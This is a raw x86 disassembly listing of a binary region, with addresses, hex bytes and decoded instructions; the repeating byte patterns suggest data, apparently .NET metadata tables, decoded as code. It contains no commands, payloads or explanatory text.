  4069c8:	fd                   	std
  4069c9:	07                   	pop    %es
  4069ca:	5f                   	pop    %edi
  4069cb:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069cf:	25 00 00 00 00       	and    $0x0,%eax
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	d0 14 64             	rclb   $1,(%esp,%eiz,2)
  4069d9:	02 5c 00 7c          	add    0x7c(%eax,%eax,1),%bl
  4069dd:	25 00 00 00 00       	and    $0x0,%eax
  4069e2:	86 18                	xchg   %bl,(%eax)
  4069e4:	07                   	pop    %es
  4069e5:	15 0e 00 5c 00       	adc    $0x5c000e,%eax
  4069ea:	20 55 00             	and    %dl,0x0(%ebp)
  4069ed:	00 00                	add    %al,(%eax)
  4069ef:	00 96 00 46 0c b1    	add    %dl,-0x4ef3ba00(%esi)
  4069f5:	02 5c 00 8f          	add    -0x71(%eax,%eax,1),%bl
  4069f9:	25 00 00 00 00       	and    $0x0,%eax
  4069fe:	96                   	xchg   %eax,%esi
  4069ff:	00 46 0c             	add    %al,0xc(%esi)
  406a02:	b8 02 5e 00 44       	mov    $0x44005e02,%eax
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 46 0c             	add    %al,0xc(%esi)
  406a10:	be 02 5f 00 78       	mov    $0x78005f02,%esi
  406a15:	20 00                	and    %al,(%eax)
  406a17:	00 00                	add    %al,(%eax)
  406a19:	00 86 18 07 15 0e    	add    %al,0xe150718(%esi)
  406a1f:	00 61 00             	add    %ah,0x0(%ecx)
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 47 0f             	add    %al,0xf(%edi)
  406a2c:	c5 02                	lds    (%edx),%eax
  406a2e:	61                   	popa
  406a2f:	00 04 56             	add    %al,(%esi,%edx,2)
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 60 0c             	add    %ah,0xc(%eax)
  406a3a:	cb                   	lret
  406a3b:	02 62 00             	add    0x0(%edx),%ah
  406a3e:	cc                   	int3
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 3c 1d d2 02 64 00 	add    %bh,0x6402d2(,%ebx,1)
  406a4c:	ab                   	stos   %eax,%es:(%edi)
  406a4d:	25 00 00 00 00       	and    $0x0,%eax
  406a52:	96                   	xchg   %eax,%esi
  406a53:	00 dd                	add    %bl,%ch
  406a55:	18 da                	sbb    %bl,%dl
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 2e                	add    %ch,(%esi)
  406a63:	06                   	push   %es
  406a64:	e1 02                	loope  0x406a68
  406a66:	68 00 e6 25 00       	push   $0x25e600
  406a6b:	00 00                	add    %al,(%eax)
  406a6d:	00 96 00 6a 10 e8    	add    %dl,-0x17ef9600(%esi)
  406a73:	02 6a 00             	add    0x0(%edx),%ch
  406a76:	6c                   	insb   (%dx),%es:(%edi)
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 a1 00 ef 02 6c    	add    %ah,0x6c02ef00(%ecx)
  406a83:	00 9c 57 00 00 00 00 	add    %bl,0x0(%edi,%edx,2)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 aa 13 f6 02 6e    	add    %ch,0x6e02f613(%edx)
  406a91:	00 78 20             	add    %bh,0x20(%eax)
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	07                   	pop    %es
  406a9b:	15 0e 00 70 00       	adc    $0x70000e,%eax
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 6d 18             	add    %ch,0x18(%ebp)
  406aaa:	84 01                	test   %al,(%ecx)
  406aac:	70 00                	jo     0x406aae
  406aae:	6c                   	insb   (%dx),%es:(%edi)
  406aaf:	59                   	pop    %ecx
  406ab0:	00 00                	add    %al,(%eax)
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	96                   	xchg   %eax,%esi
  406ab5:	00 64 18 84          	add    %ah,-0x7c(%eax,%ebx,1)
  406ab9:	01 71 00             	add    %esi,0x0(%ecx)
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	ca 0a 00             	lret   $0xa
  406ac3:	00 01                	add    %al,(%ecx)
  406ac5:	00 ca                	add    %cl,%dl
  406ac7:	0a 00                	or     (%eax),%al
  406ac9:	00 01                	add    %al,(%ecx)
  406acb:	00 ca                	add    %cl,%dl
  406acd:	0a 00                	or     (%eax),%al
  406acf:	00 01                	add    %al,(%ecx)
  406ad1:	00 ca                	add    %cl,%dl
  406ad3:	0a 00                	or     (%eax),%al
  406ad5:	00 01                	add    %al,(%ecx)
  406ad7:	00 ca                	add    %cl,%dl
  406ad9:	0a 00                	or     (%eax),%al
  406adb:	00 01                	add    %al,(%ecx)
  406add:	00 ca                	add    %cl,%dl
  406adf:	0a 00                	or     (%eax),%al
  406ae1:	00 01                	add    %al,(%ecx)
  406ae3:	00 ca                	add    %cl,%dl
  406ae5:	0a 00                	or     (%eax),%al
  406ae7:	00 01                	add    %al,(%ecx)
  406ae9:	00 ca                	add    %cl,%dl
  406aeb:	0a 00                	or     (%eax),%al
  406aed:	00 01                	add    %al,(%ecx)
  406aef:	00 ca                	add    %cl,%dl
  406af1:	0a 00                	or     (%eax),%al
  406af3:	00 01                	add    %al,(%ecx)
  406af5:	00 ca                	add    %cl,%dl
  406af7:	0a 00                	or     (%eax),%al
  406af9:	00 01                	add    %al,(%ecx)
  406afb:	00 ab 07 00 00 01    	add    %ch,0x1000007(%ebx)
  406b01:	00 54 13 00          	add    %dl,0x0(%ebx,%edx,1)
  406b05:	00 02                	add    %al,(%edx)
  406b07:	00 b0 08 00 00 03    	add    %dh,0x3000008(%eax)
  406b0d:	00 b2 10 00 00 04    	add    %dh,0x4000010(%edx)
  406b13:	00 24 18             	add    %ah,(%eax,%ebx,1)
  406b16:	00 00                	add    %al,(%eax)
  406b18:	01 00                	add    %eax,(%eax)
  406b1a:	d4 12                	aam    $0x12
  406b1c:	00 00                	add    %al,(%eax)
  406b1e:	01 00                	add    %eax,(%eax)
  406b20:	1b 0d 00 00 01 00    	sbb    0x10000,%ecx
  406b26:	c1 0d 00 00 01 00 c1 	rorl   $0xc1,0x10000
  406b2d:	0d 00 00 01 00       	or     $0x10000,%eax
  406b32:	2b 0d 00 00 01 00    	sub    0x10000,%ecx
  406b38:	d6                   	salc
  406b39:	18 00                	sbb    %al,(%eax)
  406b3b:	00 01                	add    %al,(%ecx)
  406b3d:	00 c8                	add    %cl,%al
  406b3f:	04 00                	add    $0x0,%al
  406b41:	00 02                	add    %al,(%edx)
  406b43:	00 ff                	add    %bh,%bh
  406b45:	1b 00                	sbb    (%eax),%eax
  406b47:	00 03                	add    %al,(%ebx)
  406b49:	00 64 1b 00          	add    %ah,0x0(%ebx,%ebx,1)
  406b4d:	00 01                	add    %al,(%ecx)
  406b4f:	00 33                	add    %dh,(%ebx)
  406b51:	07                   	pop    %es
  406b52:	00 00                	add    %al,(%eax)
  406b54:	01 00                	add    %eax,(%eax)
  406b56:	3f                   	aas
  406b57:	18 00                	sbb    %al,(%eax)
  406b59:	00 02                	add    %al,(%edx)
  406b5b:	00 22                	add    %ah,(%edx)
  406b5d:	1b 00                	sbb    (%eax),%eax
  406b5f:	00 01                	add    %al,(%ecx)
  406b61:	00 fd                	add    %bh,%ch
  406b63:	16                   	push   %ss
  406b64:	00 00                	add    %al,(%eax)
  406b66:	01 00                	add    %eax,(%eax)
  406b68:	35 00 00 00 02       	xor    $0x2000000,%eax
  406b6d:	00 9b 00 00 00 03    	add    %bl,0x3000000(%ebx)
  406b73:	00 9e 00 00 00 01    	add    %bl,0x1000000(%esi)
  406b79:	00 54 13 00          	add    %dl,0x0(%ebx,%edx,1)
  406b7d:	00 02                	add    %al,(%edx)
  406b7f:	00 6d 0b             	add    %ch,0xb(%ebp)
  406b82:	00 00                	add    %al,(%eax)
  406b84:	01 00                	add    %eax,(%eax)
  406b86:	ab                   	stos   %eax,%es:(%edi)
  406b87:	07                   	pop    %es
  406b88:	00 00                	add    %al,(%eax)
  406b8a:	02 00                	add    (%eax),%al
  406b8c:	ca 0a 00             	lret   $0xa
  406b8f:	00 01                	add    %al,(%ecx)
  406b91:	00 ca                	add    %cl,%dl
  406b93:	0a 00                	or     (%eax),%al
  406b95:	00 01                	add    %al,(%ecx)
  406b97:	00 ab 07 00 00 01    	add    %ch,0x1000007(%ebx)
  406b9d:	00 bc 02 00 00 01 00 	add    %bh,0x10000(%edx,%eax,1)
  406ba4:	28 0e                	sub    %cl,(%esi)
  406ba6:	00 00                	add    %al,(%eax)
  406ba8:	01 00                	add    %eax,(%eax)
  406baa:	47                   	inc    %edi
  406bab:	1c 00                	sbb    $0x0,%al
  406bad:	00 01                	add    %al,(%ecx)
  406baf:	00 e3                	add    %ah,%bl
  406bb1:	1c 00                	sbb    $0x0,%al
  406bb3:	00 01                	add    %al,(%ecx)
  406bb5:	00 b7 1b 00 00 01    	add    %dh,0x100001b(%edi)
  406bbb:	00 b7 1b 00 00 01    	add    %dh,0x100001b(%edi)
  406bc1:	00 b7 1b 00 00 01    	add    %dh,0x100001b(%edi)
  406bc7:	00 b7 1b 00 00 01    	add    %dh,0x100001b(%edi)
  406bcd:	00 32                	add    %dh,(%edx)
  406bcf:	00 00                	add    %al,(%eax)
  406bd1:	00 02                	add    %al,(%edx)
  406bd3:	00 87 00 00 00 01    	add    %al,0x1000000(%edi)
  406bd9:	00 b7 1b 00 00 01    	add    %dh,0x100001b(%edi)
  406bdf:	00 b7 1b 00 00 01    	add    %dh,0x100001b(%edi)
  406be5:	00 c1                	add    %al,%cl
  406be7:	18 00                	sbb    %al,(%eax)
  406be9:	00 01                	add    %al,(%ecx)
  406beb:	00 51 16             	add    %dl,0x16(%ecx)
  406bee:	00 00                	add    %al,(%eax)
  406bf0:	01 00                	add    %eax,(%eax)
  406bf2:	cd 16                	int    $0x16
  406bf4:	00 00                	add    %al,(%eax)
  406bf6:	01 00                	add    %eax,(%eax)
  406bf8:	cd 16                	int    $0x16
  406bfa:	00 00                	add    %al,(%eax)
  406bfc:	01 00                	add    %eax,(%eax)
  406bfe:	04 1c                	add    $0x1c,%al
  406c00:	00 00                	add    %al,(%eax)
  406c02:	01 00                	add    %eax,(%eax)
  406c04:	04 1c                	add    $0x1c,%al
  406c06:	00 00                	add    %al,(%eax)
  406c08:	01 00                	add    %eax,(%eax)
  406c0a:	04 1c                	add    $0x1c,%al
  406c0c:	00 00                	add    %al,(%eax)
  406c0e:	01 00                	add    %eax,(%eax)
  406c10:	04 1c                	add    $0x1c,%al
  406c12:	00 00                	add    %al,(%eax)
  406c14:	01 00                	add    %eax,(%eax)
  406c16:	04 1c                	add    $0x1c,%al
  406c18:	00 00                	add    %al,(%eax)
  406c1a:	01 00                	add    %eax,(%eax)
  406c1c:	c1 0d 00 00 01 00 ae 	rorl   $0xae,0x10000
  406c23:	0d 00 00 02 00       	or     $0x20000,%eax
  406c28:	b9 0d 00 00 01       	mov    $0x100000d,%ecx
  406c2d:	00 ca                	add    %cl,%dl
  406c2f:	0a 00                	or     (%eax),%al
  406c31:	00 01                	add    %al,(%ecx)
  406c33:	00 ca                	add    %cl,%dl
  406c35:	0a 00                	or     (%eax),%al
  406c37:	00 01                	add    %al,(%ecx)
  406c39:	00 ca                	add    %cl,%dl
  406c3b:	0a 00                	or     (%eax),%al
  406c3d:	00 01                	add    %al,(%ecx)
  406c3f:	00 2d 1c 00 00 01    	add    %ch,0x100001c
  406c45:	00 ca                	add    %cl,%dl
  406c47:	0a 00                	or     (%eax),%al
  406c49:	00 01                	add    %al,(%ecx)
  406c4b:	00 ab 07 00 00 01    	add    %ch,0x1000007(%ebx)
  406c51:	00 ab 07 00 00 01    	add    %ch,0x1000007(%ebx)
  406c57:	00 be 17 00 00 01    	add    %bh,0x1000017(%esi)
  406c5d:	00 be 17 00 00 01    	add    %bh,0x1000017(%esi)
  406c63:	00 ca                	add    %cl,%dl
  406c65:	0a 00                	or     (%eax),%al
  406c67:	00 01                	add    %al,(%ecx)
  406c69:	00 ca                	add    %cl,%dl
  406c6b:	0a 00                	or     (%eax),%al
  406c6d:	00 01                	add    %al,(%ecx)
  406c6f:	00 ca                	add    %cl,%dl
  406c71:	0a 00                	or     (%eax),%al
  406c73:	00 01                	add    %al,(%ecx)
  406c75:	00 fa                	add    %bh,%dl
  406c77:	1c 00                	sbb    $0x0,%al
  406c79:	00 02                	add    %al,(%edx)
  406c7b:	00 ca                	add    %cl,%dl
  406c7d:	0a 00                	or     (%eax),%al
  406c7f:	00 01                	add    %al,(%ecx)
  406c81:	00 fa                	add    %bh,%dl
  406c83:	1c 00                	sbb    $0x0,%al
  406c85:	00 02                	add    %al,(%edx)
  406c87:	00 ca                	add    %cl,%dl
  406c89:	0a 00                	or     (%eax),%al
  406c8b:	00 01                	add    %al,(%ecx)
  406c8d:	00 2a                	add    %ch,(%edx)
  406c8f:	07                   	pop    %es
  406c90:	00 00                	add    %al,(%eax)
  406c92:	01 00                	add    %eax,(%eax)
  406c94:	2a 07                	sub    (%edi),%al
  406c96:	00 00                	add    %al,(%eax)
  406c98:	01 00                	add    %eax,(%eax)
  406c9a:	6d                   	insl   (%dx),%es:(%edi)
  406c9b:	0d 00 00 01 00       	or     $0x10000,%eax
  406ca0:	ca 0a 00             	lret   $0xa
  406ca3:	00 01                	add    %al,(%ecx)
  406ca5:	00 6e 0e             	add    %ch,0xe(%esi)
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	01 00                	add    %eax,(%eax)
  406cac:	73 0e                	jae    0x406cbc
  406cae:	00 00                	add    %al,(%eax)
  406cb0:	01 00                	add    %eax,(%eax)
  406cb2:	73 0e                	jae    0x406cc2
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	01 00                	add    %eax,(%eax)
  406cb8:	cd 16                	int    $0x16
  406cba:	00 00                	add    %al,(%eax)
  406cbc:	01 00                	add    %eax,(%eax)
  406cbe:	2a 07                	sub    (%edi),%al
  406cc0:	00 00                	add    %al,(%eax)
  406cc2:	01 00                	add    %eax,(%eax)
  406cc4:	be 17 00 00 01       	mov    $0x1000017,%esi
  406cc9:	00 be 17 00 00 01    	add    %bh,0x1000017(%esi)
  406ccf:	00 ca                	add    %cl,%dl
  406cd1:	0a 00                	or     (%eax),%al
  406cd3:	00 01                	add    %al,(%ecx)
  406cd5:	00 ca                	add    %cl,%dl
  406cd7:	0a 00                	or     (%eax),%al
  406cd9:	00 01                	add    %al,(%ecx)
  406cdb:	00 ca                	add    %cl,%dl
  406cdd:	0a 00                	or     (%eax),%al
  406cdf:	00 01                	add    %al,(%ecx)
  406ce1:	00 be 17 00 00 02    	add    %bh,0x2000017(%esi)
  406ce7:	00 96 10 00 00 01    	add    %dl,0x1000010(%esi)
  406ced:	00 be 17 00 00 01    	add    %bh,0x1000017(%esi)
  406cf3:	00 77 0b             	add    %dh,0xb(%edi)
  406cf6:	00 00                	add    %al,(%eax)
  406cf8:	02 00                	add    (%eax),%al
  406cfa:	be 17 00 00 01       	mov    $0x1000017,%esi
  406cff:	00 be 17 00 00 01    	add    %bh,0x1000017(%esi)
  406d05:	00 be 17 00 00 02    	add    %bh,0x2000017(%esi)
  406d0b:	00 7d 0e             	add    %bh,0xe(%ebp)
  406d0e:	00 00                	add    %al,(%eax)
  406d10:	01 00                	add    %eax,(%eax)
  406d12:	be 17 00 00 02       	mov    $0x2000017,%esi
  406d17:	00 c4                	add    %al,%ah
  406d19:	16                   	push   %ss
  406d1a:	00 00                	add    %al,(%eax)
  406d1c:	01 00                	add    %eax,(%eax)
  406d1e:	be 17 00 00 02       	mov    $0x2000017,%esi
  406d23:	00 73 0e             	add    %dh,0xe(%ebx)
  406d26:	00 00                	add    %al,(%eax)
  406d28:	01 00                	add    %eax,(%eax)
  406d2a:	be 17 00 00 02       	mov    $0x2000017,%esi
  406d2f:	00 73 0e             	add    %dh,0xe(%ebx)
  406d32:	00 00                	add    %al,(%eax)
  406d34:	01 00                	add    %eax,(%eax)
  406d36:	be 17 00 00 02       	mov    $0x2000017,%esi
  406d3b:	00 6e 0e             	add    %ch,0xe(%esi)
  406d3e:	00 00                	add    %al,(%eax)
  406d40:	01 00                	add    %eax,(%eax)
  406d42:	be 17 00 00 02       	mov    $0x2000017,%esi
  406d47:	00 78 0e             	add    %bh,0xe(%eax)
  406d4a:	00 00                	add    %al,(%eax)
  406d4c:	01 00                	add    %eax,(%eax)
  406d4e:	be 17 00 00 02       	mov    $0x2000017,%esi
  406d53:	00 78 0e             	add    %bh,0xe(%eax)
  406d56:	00 00                	add    %al,(%eax)
  406d58:	01 00                	add    %eax,(%eax)
  406d5a:	b7 1b                	mov    $0x1b,%bh
  406d5c:	00 00                	add    %al,(%eax)
  406d5e:	01 00                	add    %eax,(%eax)
  406d60:	b7 1b                	mov    $0x1b,%bh
  406d62:	16                   	push   %ss
  406d63:	00 59 00             	add    %bl,0x0(%ecx)
  406d66:	18 00                	sbb    %al,(%eax)
  406d68:	5d                   	pop    %ebp
  406d69:	00 b1 00 f0 1a bb    	add    %dh,-0x44e51000(%ecx)
  406d6f:	01 b1 00 dc 1b bf    	add    %esi,-0x40e42400(%ecx)
  406d75:	01 b1 00 cb 19 0e    	add    %esi,0xe19cb00(%ecx)
  406d7b:	00 b9 00 ef 14 64    	add    %bh,0x6414ef00(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 07                	add    %al,(%edi)
  406d85:	15 01 03 d1 00       	adc    $0xd10301,%eax
  406d8a:	07                   	pop    %es
  406d8b:	15 0e 00 d9 00       	adc    $0xd9000e,%eax
  406d90:	07                   	pop    %es
  406d91:	15 2e 03 e9 00       	adc    $0xe9032e,%eax
  406d96:	07                   	pop    %es
  406d97:	15 6b 01 f1 00       	adc    $0xf1016b,%eax
  406d9c:	07                   	pop    %es
  406d9d:	15 6b 01 f9 00       	adc    $0xf9016b,%eax
  406da2:	07                   	pop    %es
  406da3:	15 6b 01 01 01       	adc    $0x101016b,%eax
  406da8:	07                   	pop    %es
  406da9:	15 6b 01 09 01       	adc    $0x109016b,%eax
  406dae:	07                   	pop    %es
  406daf:	15 6b 01 11 01       	adc    $0x111016b,%eax
  406db4:	07                   	pop    %es
  406db5:	15 6b 01 19 01       	adc    $0x119016b,%eax
  406dba:	07                   	pop    %es
  406dbb:	15 6b 01 21 01       	adc    $0x121016b,%eax
  406dc0:	07                   	pop    %es
  406dc1:	15 6b 01 29 01       	adc    $0x129016b,%eax
  406dc6:	07                   	pop    %es
  406dc7:	15 6b 01 31 01       	adc    $0x131016b,%eax
  406dcc:	07                   	pop    %es
  406dcd:	15 4b 02 39 01       	adc    $0x139024b,%eax
  406dd2:	07                   	pop    %es
  406dd3:	15 0e 00 41 01       	adc    $0x141000e,%eax
  406dd8:	07                   	pop    %es
  406dd9:	15 6b 01 49 01       	adc    $0x149016b,%eax
  406dde:	86 12                	xchg   %dl,(%edx)
  406de0:	7f 00                	jg     0x406de2
  406de2:	51                   	push   %ecx
  406de3:	01 6e 00             	add    %ebp,0x0(%esi)
  406de6:	c4 03                	les    (%ebx),%eax
  406de8:	59                   	pop    %ecx
  406de9:	01 f5                	add    %esi,%ebp
  406deb:	19 7f 00             	sbb    %edi,0x0(%edi)
  406dee:	51                   	push   %ecx
  406def:	01 77 10             	add    %esi,0x10(%edi)
  406df2:	84 00                	test   %al,(%eax)
  406df4:	09 00                	or     %eax,(%eax)
  406df6:	07                   	pop    %es
  406df7:	15 0e 00 61 01       	adc    $0x161000e,%eax
  406dfc:	37                   	aaa
  406dfd:	01 cd                	add    %ecx,%ebp
  406dff:	03 51 01             	add    0x1(%ecx),%edx
  406e02:	26 0c 2a             	es or  $0x2a,%al
  406e05:	01 61 01             	add    %esp,0x1(%ecx)
  406e08:	b5 0c                	mov    $0xc,%ch
  406e0a:	d3 03                	roll   %cl,(%ebx)
  406e0c:	11 00                	adc    %eax,(%eax)
  406e0e:	07                   	pop    %es
  406e0f:	15 2b 02 11 00       	adc    $0x11022b,%eax
  406e14:	cc                   	int3
  406e15:	1c d9                	sbb    $0xd9,%al
  406e17:	03 69 01             	add    0x1(%ecx),%ebp
  406e1a:	97                   	xchg   %eax,%edi
  406e1b:	1c df                	sbb    $0xdf,%al
  406e1d:	03 61 01             	add    0x1(%ecx),%esp
  406e20:	bb 16 e5 03 81       	mov    $0x8103e516,%ebx
  406e25:	01 eb                	add    %ebp,%ebx
  406e27:	01 c7                	add    %eax,%edi
  406e29:	00 79 01             	add    %bh,0x1(%ecx)
  406e2c:	3d 0d eb 03 19       	cmp    $0x1903eb0d,%eax
  406e31:	00 07                	add    %al,(%edi)
  406e33:	15 09 04 19 00       	adc    $0x190409,%eax
  406e38:	4d                   	dec    %ebp
  406e39:	0b 01                	or     (%ecx),%eax
  406e3b:	03 19                	add    (%ecx),%ebx
  406e3d:	00 3a                	add    %bh,(%edx)
  406e3f:	0b 01                	or     (%ecx),%eax
  406e41:	03 c1                	add    %ecx,%eax
  406e43:	01 71 1d             	add    %esi,0x1d(%ecx)
  406e46:	16                   	push   %ss
  406e47:	04 c1                	add    $0xc1,%al
  406e49:	01 e7                	add    %esp,%edi
  406e4b:	19 1c 04             	sbb    %ebx,(%esp,%eax,1)
  406e4e:	d1 01                	roll   $1,(%ecx)
  406e50:	07                   	pop    %es
  406e51:	15 0e 00 d1 01       	adc    $0x1d1000e,%eax
  406e56:	e0 1b                	loopne 0x406e73
  406e58:	23 04 d9             	and    (%ecx,%ebx,8),%eax
  406e5b:	01 f8                	add    %edi,%eax
  406e5d:	15 28 04 19 00       	adc    $0x190428,%eax
  406e62:	4e                   	dec    %esi
  406e63:	19 30                	sbb    %esi,(%eax)
  406e65:	04 19                	add    $0x19,%al
  406e67:	00 3d 03 bf 01 19    	add    %bh,0x1901bf03
  406e6d:	00 4e 19             	add    %cl,0x19(%esi)
  406e70:	3c 02                	cmp    $0x2,%al
  406e72:	99                   	cltd
  406e73:	01 07                	add    %eax,(%edi)
  406e75:	15 0e 00 a1 01       	adc    $0x1a1000e,%eax
  406e7a:	07                   	pop    %es
  406e7b:	15 36 02 99 01       	adc    $0x1990236,%eax
  406e80:	68 17 38 04 99       	push   $0x99043817
  406e85:	01 51 0c             	add    %edx,0xc(%ecx)
  406e88:	70 01                	jo     0x406e8b
  406e8a:	c1 01 e7             	roll   $0xe7,(%ecx)
  406e8d:	19 3f                	sbb    %edi,(%edi)
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 e0                	add    %esp,%eax
  406e93:	1b 49 04             	sbb    0x4(%ecx),%ecx
  406e96:	f1                   	int1
  406e97:	01 6d 08             	add    %ebp,0x8(%ebp)
  406e9a:	0e                   	push   %cs
  406e9b:	00 f9                	add    %bh,%cl
  406e9d:	01 07                	add    %eax,(%edi)
  406e9f:	15 4f 04 01 02       	adc    $0x201044f,%eax
  406ea4:	07                   	pop    %es
  406ea5:	15 56 04 21 00       	adc    $0x210456,%eax
  406eaa:	07                   	pop    %es
  406eab:	15 5c 04 19 00       	adc    $0x19045c,%eax
  406eb0:	34 1b                	xor    $0x1b,%al
  406eb2:	66 04 09             	data16 add $0x9,%al
  406eb5:	00 6c 0c 47          	add    %ch,0x47(%esp,%ecx,1)
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 70 1a             	add    %dh,0x1a(%eax)
  406ebe:	6c                   	insb   (%dx),%es:(%edi)
  406ebf:	04 29                	add    $0x29,%al
  406ec1:	02 07                	add    (%edi),%al
  406ec3:	15 56 04 29 00       	adc    $0x290456,%eax
  406ec8:	07                   	pop    %es
  406ec9:	15 78 04 31 02       	adc    $0x2310478,%eax
  406ece:	07                   	pop    %es
  406ecf:	15 56 04 c1 00       	adc    $0xc10456,%eax
  406ed4:	10 03                	adc    %al,(%ebx)
  406ed6:	82 04 39 02          	addb   $0x2,(%ecx,%edi,1)
  406eda:	9d                   	popf
  406edb:	07                   	pop    %es
  406edc:	8f 04 31             	pop    (%ecx,%esi,1)
  406edf:	00 78 17             	add    %bh,0x17(%eax)
  406ee2:	96                   	xchg   %eax,%esi
  406ee3:	04 c1                	add    $0xc1,%al
  406ee5:	00 6d 08             	add    %ch,0x8(%ebp)
  406ee8:	0e                   	push   %cs
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 6d 08             	add    %ch,0x8(%ebp)
  406eee:	0e                   	push   %cs
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 6d 08             	add    %ch,0x8(%ebp)
  406ef4:	0e                   	push   %cs
  406ef5:	00 c1                	add    %al,%cl
  406ef7:	00 08                	add    %cl,(%eax)
  406ef9:	03 a1 04 49 02 6e    	add    0x6e024904(%ecx),%esp
  406eff:	00 a7 04 c1 00 15    	add    %ah,0x1500c104(%edi)
  406f05:	03 ae 04 51 02 07    	add    0x7025104(%esi),%ebp
  406f0b:	15 56 04 49 01       	adc    $0x1490456,%eax
  406f10:	07                   	pop    %es
  406f11:	15 b6 04 49 01       	adc    $0x14904b6,%eax
  406f16:	99                   	cltd
  406f17:	1b bd 04 61 02 88    	sbb    -0x77fd9efc(%ebp),%edi
  406f1d:	14 cf                	adc    $0xcf,%al
  406f1f:	04 49                	add    $0x49,%al
  406f21:	02 bb 16 9f 01 19    	add    0x19019f16(%ebx),%bh
  406f27:	00 42 0f             	add    %al,0xf(%edx)
  406f2a:	d6                   	salc
  406f2b:	04 c1                	add    $0xc1,%al
  406f2d:	00 eb                	add    %ch,%bl
  406f2f:	08 de                	or     %bl,%dh
  406f31:	04 59                	add    $0x59,%al
  406f33:	02 07                	add    (%edi),%al
  406f35:	15 2b 02 c1 00       	adc    $0xc1022b,%eax
  406f3a:	ae                   	scas   %es:(%edi),%al
  406f3b:	11 15 02 c1 00 48    	adc    %edx,0x4800c102
  406f41:	0d 0e 00 61 02       	or     $0x261000e,%eax
  406f46:	f5                   	cmc
  406f47:	19 9a 00 71 02 46    	sbb    %ebx,0x46027100(%edx)
  406f4d:	19 0a                	sbb    %ecx,(%edx)
  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
  406f52:	d0 15 c7 00 a1 02    	rclb   $1,0x2a100c7
  406f58:	e5 07                	in     $0x7,%eax
  406f5a:	01 05 79 02 07 15    	add    %eax,0x15070279
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 48 18             	add    0x18(%eax),%cl
  406f66:	07                   	pop    %es
  406f67:	05 81 02 ab 06       	add    $0x6ab0281,%eax
  406f6c:	0d 05 a9 02 f4       	or     $0xf402a905,%eax
  406f71:	06                   	push   %es
  406f72:	47                   	inc    %edi
  406f73:	02 b1 02 5f 07 47    	add    0x47075f02(%ecx),%dh
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 7d 1d             	add    %edi,0x1d(%ebp)
  406f7e:	16                   	push   %ss
  406f7f:	04 81                	add    $0x81,%al
  406f81:	02 eb                	add    %bl,%ch
  406f83:	15 13 05 81 02       	adc    $0x2810513,%eax
  406f88:	3d 0f 0e 00 89       	cmp    $0x89000e0f,%eax
  406f8d:	02 07                	add    (%edi),%al
  406f8f:	15 0e 00 89 02       	adc    $0x289000e,%eax
  406f94:	01 07                	add    %eax,(%edi)
  406f96:	6b 01 b1             	imul   $0xffffffb1,(%ecx),%eax
  406f99:	02 eb                	add    %bl,%ch
  406f9b:	06                   	push   %es
  406f9c:	47                   	inc    %edi
  406f9d:	02 a1 02 ea 10 c7    	add    -0x38ef15fe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 c3                	add    %eax,%ebx
  406fa7:	18 1a                	sbb    %bl,(%edx)
  406fa9:	05 89 02 8b 18       	add    $0x188b0289,%eax
  406fae:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb1:	02 c8                	add    %al,%cl
  406fb3:	06                   	push   %es
  406fb4:	20 05 89 02 1a 1c    	and    %al,0x1c1a0289
  406fba:	4b                   	dec    %ebx
  406fbb:	02 81 02 99 1b 27    	add    0x271b9902(%ecx),%al
  406fc1:	05 c1 02 64 14       	add    $0x146402c1,%eax
  406fc6:	30 05 c9 02 7b 08    	xor    %al,0x87b02c9
  406fcc:	c7 00 91 02 c1 1c    	movl   $0x1cc10291,(%eax)
  406fd2:	35 05 c1 01 c3       	xor    $0xc301c105,%eax
  406fd7:	18 3f                	sbb    %bh,(%edi)
  406fd9:	05 91 02 c1 0a       	add    $0xac10291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 ac 18       	add    $0x18ac02d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	db 08                	fisttpl (%eax)
  406fea:	3e 01 e1             	ds add %esp,%ecx
  406fed:	02 07                	add    (%edi),%al
  406fef:	15 4c 05 d9 02       	adc    $0x2d9054c,%eax
  406ff4:	6e                   	outsb  %ds:(%esi),(%dx)
